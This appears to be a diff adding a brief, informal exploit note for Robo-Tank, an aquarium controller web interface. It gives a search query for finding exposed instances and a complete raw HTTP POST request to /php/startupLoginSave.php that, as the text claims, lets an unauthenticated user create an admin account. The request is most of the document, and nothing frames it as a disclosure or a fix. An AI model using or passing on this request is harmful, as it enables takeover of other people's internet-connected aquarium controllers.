@@ -1,0 +1,28 @@
+Robo.. Tank.. ROBO-TANK
+
+https://www.robo-tank.ca/
+
+title:"Robo-Tank"
+
+very few results but i love hack fish tanks.. don't ask..
+
+ok so you can create, as an unauth user, an admin user without any restriction using :
+
+POST /php/startupLoginSave.php HTTP/1.1
+Host: xx
+Cookie: PHPSESSID=0ise550b6vr3sr58vgc1odimr4
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 16
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+u=admin&p=tamere
